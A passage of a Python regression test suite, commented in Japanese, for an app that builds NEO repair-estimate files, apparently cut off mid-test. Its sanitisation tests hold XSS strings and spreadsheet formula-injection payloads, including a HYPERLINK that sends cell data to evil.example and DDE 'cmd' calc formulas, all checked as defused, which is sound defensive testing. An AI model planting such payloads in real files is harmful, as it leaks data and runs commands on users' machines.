# -*- coding: utf-8 -*-
"""reg_hunt3.py — 2026-09-21 夜のバグハント第 3 弾で直したもの。LLM の API は呼ばない（読み手は FakeReader）。

  E1〜E5  CSV・プレビュー取り込みの Addata 照合をやめた（右・リヤの行に左・フロントの部品コード、別の変種の品番…）
  X2      案件の見分け（_make_estimate_token）を中身全体から作る（前の案件の使用者名が別の CSV に戻っていた）
  D1      トップバーの Addata データ版・モデル名を逃がす／データ版は「2026/08」の形だけ受ける
  C1/C2   添付の書類の値を先にサイドバーへ（欄の上限で切って）入れ、NEO にはサイドバーの値そのものを渡す
  C3/C7/C8 header の工賃単価・見積日の曜日・合計欄の末尾ハイフン
  C5/C6/C13 合計欄の読み直しの周回（ページの合否・壊れた返事・車両欄・捨てた header の注意）
  B1/B5/B14 AI の相違申告（言い換え・前置き・表の上）を全文で見る
  A1/B6   ちょうど −1 円の行は理由を画面に出して止める
  B4      ③の確認チェックの鍵を確かめた中身から作る
  B2      サイドバーの費用は③でチェックを入れたときだけ
  ほか    B3/B7/B8/B9/B10/B11/B12/B13/C4/C10/C12/A3/A4/D2/D3

    python tests/reg_hunt3.py
終了コード: 0 全部 OK / 1 失敗
"""
from __future__ import annotations

import copy
import io
import json
import os
import sqlite3
import sys
import tempfile
import types

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
sys.path.insert(0, ROOT)
sys.path.insert(0, HERE)
os.chdir(ROOT)
os.environ.setdefault('NEO_ADDATA_NO_AUTODETECT', '1')
import logging  # noqa: E402

logging.getLogger('streamlit').setLevel(logging.CRITICAL)
import app  # noqa: E402
import addata_locator  # noqa: E402
import reg_reader as R  # noqa: E402
from neo_skill import llm as llm_mod  # noqa: E402
from neo_skill import maker, reader  # noqa: E402

FAILS: list = []
SRC = open(os.path.join(ROOT, 'app.py'), encoding='utf-8').read()
TPL = open(os.path.join(ROOT, 'template_toyota.neo'), 'rb').read()


def chk(cond, msg):
    if not cond:
        FAILS.append(msg)


def _erparts(neo, cols):
    ck = app.find_real_cks(neo)
    f = app.extract_files(app.decompress_neo(neo, ck), app.parse_entries(neo, ck[0])[1])
    c = sqlite3.connect(':memory:')
    c.deserialize(f['AnSMB.txt'])
    try:
        return c.execute(f'SELECT {cols} FROM ERParts ORDER BY LineNo').fetchall()
    finally:
        c.close()


class _FakeUp:
    def __init__(self, name, data):
        self.name = name
        self._d = data

    def getvalue(self):
        return self._d


def _with_state(state):
    """app の st.session_state を dict に差し替える（戻すのは呼び出し側）"""
    old = app.st
    app.st = types.SimpleNamespace(session_state=state)
    return old


# ── E1〜E5: CSV・プレビュー取り込みの Addata 照合 ─────────────────────────────

def test_addata_matching_off():
    """照合は走らせず、前の照合の跡（部品コード・照合の品番・照合レベル）を消す。NEO の部品コードは空、品番は表の部品番号だけ"""
    items = [
        {'name': 'ﾌﾛﾝﾄﾄﾞｱﾊﾟﾈﾙ 右', 'method': '取替', 'quantity': 1, 'parts_amount': 54100, 'wage': 12000, 'part_no': '',
         '_master_ref_no': '2300', 'match_level': 'L1', 'db_parts_no': '67002-10661'},
        {'name': 'ﾘﾔﾊﾞﾝﾊﾟｰｶﾊﾞｰ', 'method': '取替', 'quantity': 1, 'parts_amount': 43900, 'wage': 0, 'part_no': '52159-58941-C0',
         '_master_ref_no': '0010', 'match_level': 'L2', 'db_parts_no': '52119-58981-C0'},
        # 旧 UI のマスタの品名・品番（match_level が空だと _match_level を見て、3 以下なら品名・品番を置き換える。Codex 1 周目 P1）
        {'name': 'ﾌﾛﾝﾄﾌｪﾝﾀﾞ 右', 'method': '取替', 'quantity': 1, 'parts_amount': 30000, 'wage': 0, 'part_no': '',
         '_original_name': 'ﾌﾛﾝﾄﾌｪﾝﾀﾞ 右', '_master_name': 'Fﾌｪﾝﾀﾞ 左', '_master_part_no': '53812-X', '_match_level': 1},
    ]
    ed = {'items': copy.deepcopy(items), '_addata_matched': True}
    got = app.apply_addata_matching(ed, {'car_model_designation': '19417', 'car_category_number': '0001'})
    chk(got is False and ed['_addata_matched'] is False and not ed['_veh_match_result'].get('is_supported'),
        f'E: CSV・プレビューで照合した扱いになっている: {got} {ed.get("_veh_match_result")}')
    chk(all(it.get('_master_ref_no') == '' and it.get('db_parts_no') == '' and it.get('match_level') == ''
            and it.get('_master_name', '') == '' and it.get('_master_part_no', '') == '' and not it.get('_match_level')
            for it in ed['items']),
        f'E: 前の照合の跡が残っている: {ed["items"]}')
    neo, *_ = app.generate_neo_file(TPL, {}, ed['items'], 0, {}, infer_method=False)
    rows = _erparts(neo, 'PartsName, PartsCode, PartsNo')
    chk([(r[1], r[2]) for r in rows] == [('', ''), ('', '52159-58941-C0'), ('', '')] and rows[2][0] == 'ﾌﾛﾝﾄﾌｪﾝﾀﾞ 右',
        f'E: NEO に照合の部品コード・品番・マスタの品名が入っている（部品コードは空、品番は表の部品番号だけ）: {rows}')
    # 照合の呼び出しそのものが app から無くなっている（③の後・④の直前で照合し直していた）
    chk('match_parts_with_addata' not in SRC and 'identify_vehicle_wrapper' not in SRC,
        'E: app に Addata の部品照合・車種の特定を呼ぶ道が残っている')
    # ③の表の「部品番号」を旧 UI のマスタ品番で埋めない（照合の品番が見積書の品番に化ける。Codex 3 周目 P1）。
    # 表を作るループ（for _i, _item in enumerate(_base_items)）の中身全体を構文木で見る（Codex 4 周目）
    import ast as _ast
    _loops = [n for n in _ast.walk(_ast.parse(SRC)) if isinstance(n, _ast.For) and isinstance(n.iter, _ast.Call)
              and getattr(n.iter.func, 'id', '') == 'enumerate' and n.iter.args
              and getattr(n.iter.args[0], 'id', '') == '_base_items']
    chk(len(_loops) == 1 and '_master_part_no' not in ''.join(_ast.unparse(b) for b in _loops[0].body),
        f'E: ③の表の部品番号をマスタ品番（_master_part_no）で埋めている（表を作るループ {len(_loops)} 本）')
    chk('※ この画面から作る NEO には部品コード（Addata の参照番号）は入りません' in SRC
        and 'Addata で価格まで一致した部品が' not in SRC,
        'E: ③の断り書きが「Addata の品番を書きます」のまま')


# ── X2: 案件の見分け ─────────────────────────────────────────────────────────

def test_estimate_token():
    it = [{'name': 'ﾌﾛﾝﾄﾊﾞﾝﾊﾟ', 'parts_amount': 45000, 'wage': 12000, 'part_no': 'AAA-111'}]
    it_b = [dict(it[0], part_no='BBB-222')]
    tk = app._make_estimate_token
    chk(tk(it, None, None) == tk(copy.deepcopy(it), None, None), 'X2: 同じ明細なのに見分けが変わる（同じ見積の再開で入力が戻らない）')
    chk(tk(it, None, None) != tk(it_b, None, None), 'X2: 品番だけ違う別の CSV を同じ案件と見なしている（前の使用者名が戻る）')
    many = [{'name': f'部品{i}', 'parts_amount': 100 * i, 'wage': 0} for i in range(25)]
    many2 = copy.deepcopy(many)
    many2[22]['parts_amount'] += 1
    chk(tk(many, None, None) != tk(many2, None, None), 'X2: 21 行目以降だけ違う CSV を同じ案件と見なしている')
    chk(tk(it, b'A' * 100, None) != tk(it, b'B' * 100, None), 'X2: 同じ大きさの別の車検証を同じ案件と見なしている')
    chk(tk(None, None, None) == tk([], None, None) and len(tk(None, None, None)) == 64, 'X2: 明細なしの見分けが揺れる')
    # プレビュー取り込みは取り込み元の見積書も見分けに入れる（明細がまったく同じ別の見積書で前の入力を戻さない。Codex 4 周目 P1）
    chk(tk(it, None, b'src-A') != tk(it, None, b'src-B'), 'X2: 取り込み元の違いを見分けに入れていない')
    for frag in ("_p2n_beta['file_key'] = _p2n_file_key",
                 "'src': str(_p2n_res.get('file_key') or _p2n_res.get('inputs_sig') or ''),",
                 "_csv_items_s2, vehicle_bytes, (_src_s2.encode('utf-8') if _src_s2 else None))"):
        chk(frag in SRC, f'X2: プレビュー取り込みの見分けに取り込み元の見積書を入れていない: {frag}')


# ── D1: トップバー ───────────────────────────────────────────────────────────

def test_topbar_escape_and_version_shape():
    d = tempfile.mkdtemp(prefix='hunt3_anver_')
    try:
        os.makedirs(os.path.join(d, 'COM'))
        p = os.path.join(d, 'COM', 'AnVer.DB')
        for raw, want in (('Number=2026/08', '2026/08'), ('Number=<img src=x onerror=alert(1)>', ''),
                          ('Number=2026/08<iframe srcdoc="x">', ''), ('Number=', '')):
            with open(p, 'wb') as fh:
                fh.write(bytes(b ^ 0xFF for b in (raw + '\r\n').encode('cp932')))
            chk(addata_locator.addata_version(d) == want, f'D1: データ版 {raw!r} → {addata_locator.addata_version(d)!r}（{want!r} のはず）')
    finally:
        import shutil
        shutil.rmtree(d, ignore_errors=True)
    chk("html_escape(_ad_top_ver or '接続')" in SRC and 'モデル: {html_escape(selected_model)}' in SRC,
        'D1: トップバーのデータ版・モデル名を逃がさずに HTML に入れている')


# ── C3/C7/C8: header の値 ───────────────────────────────────────────────────

def test_header_values():
    def norm(**kw):
        h = copy.deepcopy(R.HEADER)
        h.update(kw)
        notes = []
        return reader._normalise_header(h, None, None, notes=notes), notes
    for raw, want in ((8000, 8000), ('8000', 8000), ('8,000円', 8000), ('1時間 8,000円', 8000), ('8,000円/1H', 8000),
                      ('時間あたり 7,500 円', 7500)):
        h, _ = norm(labor_rate=raw)
        chk(h.get('labor_rate') == want, f'C3: labor_rate {raw!r} → {h.get("labor_rate")!r}（{want} のはず）')
    for raw in (1, '1', '1H=8000', '8000円 / 9000円', 50000, '不明'):
        h, notes = norm(labor_rate=raw)
        chk('labor_rate' not in h and any('labor_rate' in n for n in notes),
            f'C3: 工賃単価として読めない labor_rate {raw!r} を使っている／知らせていない: {h.get("labor_rate")!r} {notes}')
    try:
        h, _ = norm(est_date='2026/09/13(日)')
        chk(h.get('est_date') == '20260913', f'C7: 曜日付きの見積日を読めない: {h.get("est_date")!r}')
    except reader.PageShapeError as e:
        chk(False, f'C7: 曜日付きの見積日で読み取りを止めている: {e}')
    h, _ = norm(totals={'parts': '45,000-', 'wage': '¥16,000-', 'total': '67,100－', 'tax': '-500'})
    chk(h['totals'] == {'parts': 45000, 'wage': 16000, 'total': 67100, 'tax': '-500'},
        f'C8: 合計欄の末尾ハイフンを数にしていない（先頭のマイナスは変えない）: {h["totals"]}')


# ── C5/C6/C13: 合計欄の読み直しの周回 ────────────────────────────────────────

class _CutReader(R.FakeReader):
    """'CUT' の番は max_tokens で切れた返事にする"""
    def ask(self, system, blocks, **_):
        self.calls += 1
        self.prompts.append([b['text'] for b in blocks if b.get('type') == 'text'][-1])
        if not self.answers:
            raise llm_mod.LLMError('用意した返事を使い切った')
        a = self.answers.pop(0)
        if a == 'CUT':
            rep = llm_mod.LLMReply(text='{"page": 1, "rows_prin', stop_reason='max_tokens', input_tokens=10, output_tokens=5)
            raise llm_mod.LLMReplyError('返事が max_tokens（16000）で切れた。', rep)
        return llm_mod.LLMReply(text=a, stop_reason='end_turn', input_tokens=10, output_tokens=5)


def _read(answers, reader_cls=R.FakeReader, n_pages=1):
    case = tempfile.mkdtemp(prefix='neo_case_hunt3_')
    try:
        return reader.read_estimate(R.blank_pdf(n_pages), reader=reader_cls(answers), case_dir=case, source_name='t.pdf')
    finally:
        maker.remove_case_dir(case)


def test_reader_rounds():
    hdr = copy.deepcopy(R.HEADER)
    p1 = {'page': 1, 'rows_printed': 1, 'subtotal': {'parts': 45000, 'wage': 8000}, 'marks': {},
          'blocks': [{'title': 'リヤバンパ', 'rows': [R.ROWS[0]]}]}
    p2 = {'page': 2, 'rows_printed': 1, 'subtotal': {'wage': 8000}, 'marks': {},
          'blocks': [{'title': 'リヤバンパ', 'rows': [R.ROWS[1]]}]}
    ans = [json.dumps(a, ensure_ascii=False) if isinstance(a, dict) else a
           for a in (hdr, p1, 'CUT', 'CUT', 'CUT', 'CUT', hdr, p1, p2)]
    res = _read(ans, _CutReader, n_pages=2)
    chk(res.ok and all(t.ok for t in res.traces) and not res.fails(),
        f'C5: 読み直しで検算に通ったページが不合格のまま: ok={res.ok} {[(t.page, t.ok) for t in res.traces]}')
    # 2 周目の返事が 2 回とも壊れていても、それまでの読み取りは残す（読み取り全体を捨てていた）
    bad = copy.deepcopy(R.HEADER)
    bad['totals'] = dict(bad['totals'], total=bad['totals']['total'] + 1000, taxable=bad['totals']['taxable'] + 1000)
    res = _read([bad, R.PAGE_OK, bad, '{"page": 1, "blocks": [', '{"page": 1, "blocks": ['])
    chk(res.reading is not None and not res.error, f'C6: 2 周目の壊れた返事で読み取り全体を捨てた: error={res.error!r}')
    # 1 周目の header の読み直しが車両欄を落としても、最初に読めた車両を引き継ぐ
    fix = copy.deepcopy(R.HEADER)
    fix.pop('vehicle')
    res = _read([bad, R.PAGE_OK, fix])
    chk(res.ok and res.header.get('vehicle') == R.HEADER['vehicle'],
        f'C6: 読み直しの header が落とした車両欄を引き継いでいない: ok={res.ok} {res.header.get("vehicle")}')
    # 読み直しの header が車両欄の一部だけ返しても、最初の写しの欄（型式指定・類別など）を落とさない（Codex 2 周目 P1）
    part = copy.deepcopy(R.HEADER)
    part['vehicle'] = {'model_code': R.HEADER['vehicle']['model_code']}
    res = _read([bad, R.PAGE_OK, part])
    chk(res.ok and res.header.get('vehicle') == R.HEADER['vehicle'],
        f'C6: 読み直しの header が車両欄の一部だけ返すと、最初の写しの欄が消える: {res.header.get("vehicle")}')
    # 合計欄の読み直しで車は変わらない（読み直させたのは合計欄・塗装・レバーレート）。読み直した合計欄は使う
    fix2 = copy.deepcopy(R.HEADER)
    fix2['vehicle'] = dict(fix2['vehicle'], color_code='NH731P')
    res = _read([bad, R.PAGE_OK, fix2])
    chk(res.ok and res.header.get('vehicle') == R.HEADER['vehicle'] and res.header.get('totals') == R.HEADER['totals'],
        f'C6: 合計欄の読み直しで車両欄が変わった／直した合計欄を使っていない: {res.header.get("vehicle")} {res.header.get("totals")}')
    # 形の読み直しで捨てた header について書いた注意は残さない／採った header の注意は残す
    h1 = copy.deepcopy(R.HEADER)
    h1.pop('totals')
    h1['wage_round'] = 100
    h1['target_total'] = 99999
    res = _read([h1, copy.deepcopy(R.HEADER), R.PAGE_OK])
    chk(res.ok and not any('wage_round' in n or 'target_total' in n for n in res.app_notes + list(res.check.get('warn') or [])),
        f'C13: 捨てた header の注意が残っている: {res.app_notes}')
    h3 = copy.deepcopy(R.HEADER)
    h3['labor_rate'] = '1H=8000'
    res = _read([h3, R.PAGE_OK])
    chk(any('labor_rate' in n for n in res.app_notes), f'C13: 採った header の注意（labor_rate を使わない）が消えた: {res.app_notes}')


# ── C1/C2: 添付の書類 → サイドバー → NEO ─────────────────────────────────────

def test_doc_fill_consistency():
    S = {'upload_seq': 0, 'docs_upload_0': [_FakeUp('sokuho.png', b'x')], '_insdoc_ocr_id': 'set1|model-A|k'}
    old = _with_state(S)
    try:
        long_branch = 'ケンショウ損保九州損害サポート部福岡自動車センター'   # 20 字を超える
        long_contractor = '株式会社ケンショウロジスティクス九州支店'
        app._doc_fill_to_sidebar({'accept_no': 'ZZ-0001', 'branch': long_branch, 'contractor': long_contractor})
        chk(S.get('adjuster_post') == long_branch[:20] and S['_insdoc_filled'].get('adjuster_post') == long_branch[:20]
            and S.get('contractor_name') == long_contractor[:20],
            f'C2: 書類の値を欄の上限で切らずに入れている: {S.get("adjuster_post")!r} {S.get("_insdoc_filled")}')
        # 欄を描いたとき（Streamlit が上限で切る）と、読んだときの保険 hint が同じ（橋渡しの取り置きを捨てない・生成直後に陳腐化しない）
        h_read = app._sidebar_insurance_hint()
        for k, n in app._SIDEBAR_MAX_CHARS.items():
            if isinstance(S.get(k), str):
                S[k] = S[k][:n]
        chk(app._doc_key({}, {}, h_read) == app._doc_key({}, {}, app._sidebar_insurance_hint()),
            'C2: 欄を描いたあとで保険 hint が変わる（生成直後に「入力が変わりました」・取り置きを捨てる）')
        # 同じ書類を別のモデルで読み直した: 書類から入れたままの欄は新しい読みに替わり、NEO に渡る値（サイドバー）も新しい読み
        S['_insdoc_ocr_id'] = 'set1|model-B|k'
        S['policy_no'] = 'USER-9'                       # 利用者が手で入れた欄は書き換えない
        app._doc_fill_to_sidebar({'accept_no': 'ZZ-0007', 'branch': long_branch, 'policy_no': 'DOC-1'})
        h = app._sidebar_insurance_hint()
        chk(h.get('accept_no') == 'ZZ-0007' and h.get('policy_no') == 'USER-9',
            f'C1: 読み直した書類の値が NEO に渡る値（サイドバー）に入っていない／手入力を書き換えた: {h}')
    finally:
        app.st = old


# ── B1/B5/B14: AI の相違申告 ──────────────────────────────────────────────────

def test_ai_diff_notes():
    m, note = app._csv_ai_diff_marks, app._ai_diff_note
    for raw, want in (('部品代相違1,200円 工賃相違0円', ['部品相違']), ('技術料相違8,000円 部品相違0円', ['工賃相違']),
                      ('総額相違1,320円 工賃相違0円', ['合計相違']), ('⚠️ 部品代相違1,200円 工賃相違0円', ['部品相違']),
                      ('※部品金額相違1,200円／工賃相違なし', ['部品相違']), ('部品差異1,200円', ['部品相違']),
                      ('部品の相違 1,200円', ['部品相違']), ('相違: 部品 1,200円', ['合計相違']),
                      ('差額1,200円（部品）: 工賃相違0円', ['合計相違'])):
        n = note(raw)
        chk(n and m([n]) == want, f'B1: 申告 {raw!r} → {n!r} {m([n]) if n else None}（{want} のはず）')
        chk(n and n.lstrip('⚠️※ ') == raw.lstrip('⚠️※ '), f'B1: 申告の文を切り詰めている: {raw!r} → {n!r}')
    for raw in ('部品相違0円 工賃相違0円', '相違確認結果: 部品相違0円 工賃相違0円', '部品相違・工賃相違はありません'):
        chk(m([note(raw)]) == [], f'B1: 相違の無い申告を相違にしている: {raw!r} → {m([note(raw)])}')
    chk(note('上記のとおりです。') is None and not app._is_ai_diff_text('⚠️ CSV の中の注意: 部品相違…'),
        'B1: 申告でない文・アプリの知らせを申告にしている')
    h = '品名,区分,数量,部品金額,工賃,部品コード\n'
    it, notes = app.parse_csv_to_items(h + 'ﾌﾛﾝﾄﾊﾞﾝﾊﾟ,取替,1,45000,0,52119-X\nﾌﾛﾝﾄﾊﾞﾝﾊﾟ脱着,脱着,1,0,8000,\n"部品代相違1,200円 工賃相違0円"\n',
                                       return_notes=True)
    d = [n for n in notes if app._is_ai_diff_text(n)]
    chk(len(it) == 2 and d == ['部品代相違1,200円 工賃相違0円'] and m(d) == ['部品相違'],
        f'B1: 「部品代相違」の申告の部品側が消える: {it} / {notes}')
    it, notes = app.parse_csv_to_items('"部品相違1,200円 工賃相違0円"\n' + h + 'ﾌﾛﾝﾄﾊﾞﾝﾊﾟ,取替,1,45000,0,\n', return_notes=True)
    chk(len(it) == 1 and m([n for n in notes if app._is_ai_diff_text(n)]) == ['部品相違'],
        f'B5: 表の上の申告を捨てている: {it} / {notes}')
    it, notes = app.parse_csv_to_items(h + 'ﾌﾛﾝﾄﾊﾞﾝﾊﾟ,取替,1,45000,0,\n相違: 部品 1,200円\n部品差異1,200円\n', return_notes=True)
    chk(len(it) == 1 and m([n for n in notes if app._is_ai_diff_text(n)]),
        f'B14: 言い換えの申告を 0 円の明細として取り込んでいる: {[x["name"] for x in it]} / {notes}')
    # 逆向き: 相違の語を含む正しい明細（金額あり）は明細のまま
    it, notes = app.parse_csv_to_items(h + 'ﾌﾛﾝﾄﾊﾞﾝﾊﾟ,取替,1,45000,0,\nﾊﾟﾈﾙ部品相違調整,調整,1,0,3000,\n', return_notes=True)
    chk(len(it) == 2, f'B1: 金額のある明細を申告として捨てている: {it} / {notes}')
    chk("_csv_diffs = [n for n in _csv_notes if _is_ai_diff_text(n)]" in SRC, 'B1: ①で申告を全文で見分けていない')


# ── A1/B6: ちょうど −1 円 ──────────────────────────────────────────────────────

def test_minus_one_reason():
    rows = [{'name': 'ﾌﾛﾝﾄﾊﾞﾝﾊﾟ', 'method': '取替', 'quantity': 1, 'parts_amount': 45000, 'wage': 0},
            {'name': '端数値引', 'method': '', 'quantity': 1, 'parts_amount': -1, 'wage': 0}]
    try:
        app.generate_neo_file(TPL, {}, rows, 0, {}, infer_method=False)
        chk(False, 'A1: −1 円の行で止まらない')
    except Exception as e:  # noqa: BLE001
        chk(isinstance(e, app.NeoInputError), f'A1: −1 円の行を画面に理由を出せる例外（NeoInputError）で止めていない: {type(e).__name__}')
        chk('端数値引' in str(e) and '−1' in str(e), f'A1: 止めた理由に行が出ない: {e}')
    chk(issubclass(app.NeoInputError, ValueError), 'A1: NeoInputError が ValueError でない（呼び出し側の扱いが変わる）')
    chk('if isinstance(e, NeoInputError):' in SRC and '"❌ NEO を作れません: " + _md_literal(str(e))' in SRC,
        'A1: ④が −1 円の理由を出さない（「種類: ValueError」だけ）')


# ── B4: ③の確認チェックの鍵 ────────────────────────────────────────────────────

def test_ack_keys():
    k = app._ack_key
    chk(k('adj', 'a', [1]) == k('adj', 'a', [1]) and k('adj', 'a', [1]) != k('adj', 'a', [2])
        and k('adj', 'a', [1]).startswith('adj__'), 'B4: 確認の鍵が中身で変わらない／同じ中身で揺れる')
    # 金額の差異の確認も、差の値だけでなく明細の指紋から鍵を作る（差が同じまま行を直しても確認が残っていた。Codex 1 周目 P1）
    chk("_amt_key = _ack_key('amount_confirmed', _disc_sig, _ack_base)" in SRC, 'B4: 金額の差異の確認の鍵に明細の指紋が無い')
    for frag in ("key=_cls_key", "key=_amt_key", "key=_ack_key('preview_ack_confirmed', _ack_base)",
                 "key=_ack_key('adj_rows_confirmed', _ack_base)", "key=_ack_key('csv_ai_diff_confirmed', _ack_base, _ai_notes)"):
        chk(frag in SRC, f'B4: ③の確認チェックが中身から作った鍵を使っていない: {frag}')
    for old in ("key='adj_rows_confirmed'", "key='preview_ack_confirmed'", "key='amount_confirmed'", "key='classification_confirmed'",
                "key='csv_ai_diff_confirmed'"):
        chk(old not in SRC, f'B4: 中身が変わっても外れない固定の鍵が残っている: {old}')


# ── B2: サイドバーの費用 ──────────────────────────────────────────────────────

def test_expenses_gate():
    for frag, why in (("key=_ack_key('s3_use_expenses'", '③に「サイドバーの費用を入れる」のチェックが無い'),
                      ("estimate_data['_expenses_use'] = list(_exp_vals_s3) if _exp_use_s3 else None", '③のチェックを④に運んでいない'),
                      ("elif not estimate_data.get('_expenses_use'):", '③の合計がチェックなしでも費用を足している'),
                      ("or not (estimate_data or {}).get('_expenses_use')", '③の合計の帯がチェックなしでも費用を足している'),
                      ("elif [safe_int(_x) for _x in _exp_use_s4] != _exp_now_s4:", '④で③の後に変えた費用を止めていない'),
                      ("CSV 取り込み・プレビューでは、ステップ③の「💰 合計・費用」でチェックを入れたときだけ使われます。",
                       'サイドバーの断り書きに CSV・プレビューの扱いが無い')):
        chk(frag in SRC, f'B2: {why}')


# ── B3 / C4 / C12 / A3 / A4 / B8 / B9 / B10 / B11: 画面の配線 ──────────────────────

def test_screen_wiring():
    for frag, why in (
            ("data=(b'' if _stale else res['unverified_neo'])", 'C4: 陳腐化した「要確認」の NEO をボタンに渡している'),
            ("data=(b'' if _stale else res['unverified_review'])", 'C4: 陳腐化した「要確認」のシートをボタンに渡している'),
            ("data=(b'' if _p2n_res.get('stale') else _p2n_res['repair_zip'])", 'C4: 陳腐化した修正用ファイルをボタンに渡している'),
            ("🕘 前の入力で作った結果です（", 'C12: 陳腐化したベタ打ちの結果に緑の「解析完了」を出している'),
            ("pass   # 前の入力の検証の結果は出さない", 'C12: 陳腐化したベタ打ちの結果に「検証OK」を出している'),
            ("'消費税（費用・SP 分）'", 'A3: 税込で費用があると帯の内訳の和が合計にならない'),
            ('（NEO − 元見積 = {_diff_txt}）', 'A4: ④の差額の符号がいつも ▲'),
            ("bool(is_tax_inclusive), tuple(safe_int(_v) for _v in expense_info.values()), _items_sig(items),",
             'B8: 税区分・費用・明細が違う NEO に同じ名前を使い回している'),
            ("'name': to_halfwidth_katakana(_nv),", 'B9: ③で直した品名のカタカナを半角にしていない'),
            ("'_qty_blank': bool(pd.isna(_row.get('数量'))),", 'B10: 数量を消した行を覚えていない'),
            ('❌ 数量が空の行があります（', 'B10: 数量を消した行で止めていない'),
            ("('区分',     _wit.get('method', ''),  _ERPARTS_WIDTH['DisposalName']),", 'B11: 区分が 8 バイトで切れることを知らせていない'),
            ("_pv_m = _infer_method_from_name(_pv_it)", 'B3: プレビュー取り込みで区分を表に入れていない'),
            ("st.error(_md_literal(_note))", 'D3: CSV の知らせを Markdown として描いている'),
            ("_xml_escape(vehicle_info.get('car_name', ''))", 'D3: 報告 PDF の車名を逃がしていない')):
        chk(frag in SRC, why)
    chk(SRC.count("_xml_escape(vehicle_info.get('car_name', ''))") == 2, 'D3: 報告 PDF 2 本のどちらかで車名を逃がしていない')
    bridge = open(os.path.join(ROOT, 'neo_skill', 'addata_bridge', 'index.html'), encoding='utf-8').read()
    chk('if (ev.source !== window.parent) return;' in bridge, 'D3: 橋渡しの部品が親以外の窓からの描画の知らせを受ける')


# ── B7: 行の呼び方 ────────────────────────────────────────────────────────────

def test_row_ref():
    chk(app._row_ref({'_ed_no': 3}, 5) == 'No 3' and app._row_ref({'_ed_no': None}, 5) == '表で足した行（上から 5 行目）'
        and app._row_ref({}, 5) == 'No 5' and app._row_ref({'_ed_no': 3}, 5, '行') == '行3',
        'B7: 表で足した行を別の行の No で呼んでいる')
    a = app.check_parts_labor_classification([{'name': 'ﾐﾗｰ', 'method': '脱着', 'parts_amount': 1000, 'wage': 2000, '_ed_no': None}])
    chk(a and a[0]['message'].startswith('表で足した行（上から 1 行目）「ﾐﾗｰ」'), f'B7: 区分確認で足した行を位置の番号で呼んでいる: {a}')
    a = app.check_parts_labor_classification([{'name': 'ﾐﾗｰ', 'method': '脱着', 'parts_amount': 1000, 'wage': 2000, '_ed_no': 4}])
    chk(a and a[0]['message'].startswith('行4「ﾐﾗｰ」'), f'B7: 取り込んだ行の呼び方が変わった: {a}')


# ── B12 / D3: ファイル名 ──────────────────────────────────────────────────────

def test_filename_reg():
    n = app.generate_filename({'car_reg_department': '品川', 'car_reg_division': '３００', 'car_reg_business': 'ア',
                               'car_reg_serial': '12-34'}, 0, 0, 0, 0, False)
    chk(n == '品川300あ1234_見積.neo', f'B12: ファイル名の登録番号が NEO の中と違う形: {n}')
    n = app.generate_filename({'car_reg_department': '../品川', 'car_reg_division': '300', 'car_reg_business': 'あ',
                               'car_reg_serial': '12\n34'}, 0, 0, 0, 0, False)
    chk('/' not in n and '\n' not in n and n.endswith('_見積.neo'), f'D3: ファイル名に使えない文字が残る: {n!r}')


# ── B13: CSV の円未満の金額 ────────────────────────────────────────────────────

def test_csv_fraction_notice():
    it, notes = app.parse_csv_to_items('品名,区分,数量,部品金額,工賃\nｸﾘｯﾌﾟ,取替,1,2750.50,0\nﾄﾞｱ脱着,脱着,1,0,8000\n', return_notes=True)
    chk(it and it[0]['parts_amount'] == 2751 and any('円未満の端数' in n and 'ｸﾘｯﾌﾟ' in n for n in notes),
        f'B13: 円未満の金額を黙って丸めている: {it} / {notes}')
    it, notes = app.parse_csv_to_items('品名,区分,数量,部品金額,工賃\nｸﾘｯﾌﾟ,取替,1,2750,0\nﾄﾞｱ脱着,脱着,1,0,8000\n', return_notes=True)
    chk(not any('円未満の端数' in n for n in notes), f'B13: 整数の金額に端数の知らせを出している: {notes}')


# ── C10: 見積書の入口 ─────────────────────────────────────────────────────────

def test_upload_gate():
    from pypdf import PdfWriter
    w = PdfWriter()
    for _ in range(31):
        w.add_blank_page(width=200, height=200)
    b = io.BytesIO()
    w.write(b)
    big = b.getvalue()
    chk('31 ページ' in app._upload_kind_problem(big, 'x.pdf', max_pages=30), 'C10: 上限を超えるページ数の見積書を入口で止めない')
    chk(app._upload_kind_problem(big, 'x.pdf') == '', 'C10: 添付（上限なし）のページ数まで止めている')
    w = PdfWriter()
    w.add_blank_page(width=200, height=200)
    w.encrypt(user_password='pw', owner_password='owner')
    b = io.BytesIO()
    w.write(b)
    msg = app._upload_kind_problem(b.getvalue(), 'x.pdf', max_pages=30)
    chk('パスワード' in msg, f'C10: パスワード付きの PDF を「壊れている」と案内している: {msg}')


# ── D2: 確認箇所シートの数式 ──────────────────────────────────────────────────

def test_review_sheet_defuse():
    import openpyxl
    wb = openpyxl.Workbook()
    ws = wb.active
    ws.append(['No', '品名', 'メモ'])
    ws.append([1, '=HYPERLINK("http://evil.example/"&C2,"CLICK")', "=cmd|' /c calc'!A1"])
    ws.append([2, 'ﾌﾛﾝﾄﾊﾞﾝﾊﾟ', '-5000'])
    b = io.BytesIO()
    wb.save(b)
    out = app._defuse_review_sheet(b.getvalue(), '.xlsx')
    wb2 = openpyxl.load_workbook(io.BytesIO(out))
    cells = [c for row in wb2.active.iter_rows() for c in row]
    chk(not any(c.data_type == 'f' for c in cells), 'D2: 確認箇所シートに生きた数式が残る')
    chk(wb2.active['B2'].value == '=HYPERLINK("http://evil.example/"&C2,"CLICK")' and wb2.active['B3'].value == 'ﾌﾛﾝﾄﾊﾞﾝﾊﾟ',
        'D2: 数式を文字に戻すとき値が変わった')
    clean = io.BytesIO()
    wb3 = openpyxl.Workbook()
    wb3.active.append(['a', 'b'])
    wb3.save(clean)
    chk(app._defuse_review_sheet(clean.getvalue(), '.xlsx') == clean.getvalue(), 'D2: 数式の無いシートまで書き直している')
    csv_in = ('No,品名,メモ\r\n1,=cmd|x,-5000\r\n2,+81,-2+3+cmd\r\n').encode('utf-8-sig')
    csv_out = app._defuse_review_sheet(csv_in, '.csv').decode('utf-8-sig')
    chk("'=cmd|x" in csv_out and ',-5000' in csv_out and ',+81,' in csv_out and "'-2+3+cmd" in csv_out,
        f'D2: CSV の数式の無害化が違う: {csv_out!r}')
    chk(app._defuse_review_sheet(b'not-a-zip', '.xlsx') == b'not-a-zip', 'D2: 読めないシートを渡さなくなった')
    chk(SRC.count('_read_review_sheet(') >= 5, 'D2: 確認箇所シートを無害化せずに渡す道が残っている')
    # 配る道そのもの（ファイルから読んで無害化する _read_review_sheet）を一時ファイルで通す（Codex 講評 5 周目）
    d = tempfile.mkdtemp(prefix='hunt3_sheet_')
    try:
